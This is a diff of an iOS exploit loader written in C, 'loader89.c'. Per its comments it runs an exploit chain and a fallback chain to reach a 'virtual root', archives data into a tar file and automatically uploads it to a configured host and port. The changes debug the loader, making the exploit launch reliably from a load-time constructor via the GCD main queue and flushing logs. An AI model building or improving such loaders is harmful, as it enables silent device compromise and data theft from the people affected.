@@ -1,10 +1,17 @@
-/* loader89.c - 89yl 双链路加载器 v6.0 (onemain-noinit-clash)
+/* loader89.c - 89yl 双链路加载器 v6.5 (init-timing)
  * exploit chain: AcqViewCntrlr_ RunServer + Sploit
  * MHA/MCM fallback chain: libuiopsersvc `_mcm_filza_run` -> virtual root
  * Both chains write a real tar archive and auto-upload it.
  * v6.0 fix A: core sink init (0x59fa28) is one-shot per process (atomic guard).
  * v6.0 fix B: direct exploit fallback prefers the GCD main queue (dlsym'd),
  *             pthread only as fallback; parent wait budget 60s @ 250ms.
+ * v6.5 init-timing: constructor no longer starts the worker directly.
+ *             dlopen issued while dyld is still running initializers leaves
+ *             the new image's __mod_init_func unexecuted (34 core
+ *             initializers skipped -> global map core+0x6c3800 all-zero ->
+ *             Sploit dereferences NULL at core+0x7674; v65_crash_report.md).
+ *             The worker launch is deferred to the GCD main queue so dlopen
+ *             happens in a normal runloop turn. Logs are flushed per line.
  */
 typedef unsigned long u64;
 typedef long long i64;
@@ -30,6 +37,7 @@ extern char *getenv(const char *);
 extern int strcmp(const char *, const char *);
 extern int dup2(int, int);
 extern int fflush(void *);
+extern int fsync(int);
 extern int atoi(const char *);
 extern unsigned int _dyld_image_count(void);
 extern const void *_dyld_get_image_header(unsigned int);
@@ -101,7 +109,17 @@ static char g_host[128];
 static int g_port = LOADER89_DEFAULT_PORT;
 
 static void raw_log(const char *s) {
-    if (g_logfd >= 0) { write(g_logfd, s, strlen(s)); write(g_logfd, "\n", 1); }
+    if (g_logfd >= 0) {
+        write(g_logfd, s, strlen(s));
+        write(g_logfd, "\n", 1);
+        /* v6.5: flush per line so a panic / device reset cannot swallow the
+         * log. g_logfd is a raw fd (write() is unbuffered), but stdout/stderr
+         * FILE* streams are dup2'd onto it and the kernel page cache still
+         * needs fsync to survive a full reset. fflush(0) drains any stdio
+         * buffers, fsync(g_logfd) pushes the line to storage immediately. */
+        fflush(0);
+        fsync(g_logfd);
+    }
     if (p_nslog && p_getClass && p_msgSend && p_sel) {
         void *nsstring = p_getClass("NSString");
         if (nsstring) {
@@ -1190,7 +1208,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v6.4 runserver-thread start ===");
+    log_info("=== loader89 v6.5 init-timing start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
@@ -1460,12 +1478,62 @@ static void *worker(void *arg) {
 
 static void *g_thread_start;
 
+/* v6.5 init-timing fix: the worker (which dlopens the core) must NOT run
+ * while the process is still inside dyld initialization. Starting it straight
+ * from this __attribute__((constructor)) meant the pthread could dlopen
+ * libwebuiopsercore during the startup initializer phase, and dyld then does
+ * NOT run the new image's 34 __mod_init_func - the core global map at
+ * core+0x6c3800 stays all-zero and Sploit dereferences NULL at core+0x7674
+ * (v65_crash_report.md, five rounds consistent). Fix: the constructor only
+ * enqueues the launch on the GCD main queue via dispatch_async_f; the main
+ * queue callback runs in a normal runloop turn after launch - outside any
+ * image-initialization context - and only there pthread_creates the detached
+ * worker. dyld then executes the core's initializers naturally.
+ *
+ * Resolution stays header-free (same dlsym pattern as v6.0 fix B):
+ * dispatch_async_f is a real exported function; on Darwin
+ * dispatch_get_main_queue is a macro over the exported global
+ * _dispatch_main_q, so the function name may not resolve - fall back to
+ * dlsym("_dispatch_main_q"), whose returned address IS the main queue handle
+ * (identical to what the macro passes). Only if BOTH fail do we keep the
+ * pre-v6.5 pthread-from-constructor behavior as a last resort; libdispatch is
+ * always present in any iOS process, so that path is effectively unreachable.
+ * stub_core_net_sink / resolve_core_base / exploit state machine / MHA-MCM /
+ * upload chain are untouched. */
+static void deferred_worker_launch(void *ctx) {
+    (void)ctx;
+    void *th = 0;
+    if (pthread_create(&th, 0, worker, 0) == 0) {
+        pthread_detach(th);
+        return;
+    }
+    /* pthread_create failed: run the chain inline on this main-queue
+     * callback rather than losing the loader entirely. */
+    worker(0);
+}
+
 #ifndef LOADER89_APP_DISABLED
 __attribute__((constructor))
 static void loader89_init(void) {
+    g_thread_start = (void *)worker;   /* marker for self-check tooling */
+    void *(*gmq)(void) = (void *(*)(void))dlsym(RTLD_DEFAULT, "dispatch_get_main_queue");
+    void (*dasync)(void *, void *, void (*)(void *)) = 0;
+    void *mq = 0;
+    if (gmq) dasync = (void (*)(void *, void *, void (*)(void *)))dlsym(RTLD_DEFAULT, "dispatch_async_f");
+    if (gmq && dasync) mq = gmq();
+    if (!mq) {
+        void *mainq = dlsym(RTLD_DEFAULT, "_dispatch_main_q");
+        if (mainq) {
+            dasync = (void (*)(void *, void *, void (*)(void *)))dlsym(RTLD_DEFAULT, "dispatch_async_f");
+            if (dasync) mq = mainq;
+        }
+    }
+    if (mq && dasync) {
+        dasync(mq, 0, deferred_worker_launch);
+        return;
+    }
+    /* last resort (pre-v6.5 behavior): plain detached pthread */
     static void *th;
-    void *(*fn)(void *) = worker;
-    g_thread_start = (void *)fn;
     if (pthread_create(&th, 0, worker, 0) == 0) pthread_detach(th);
 }
 #endif
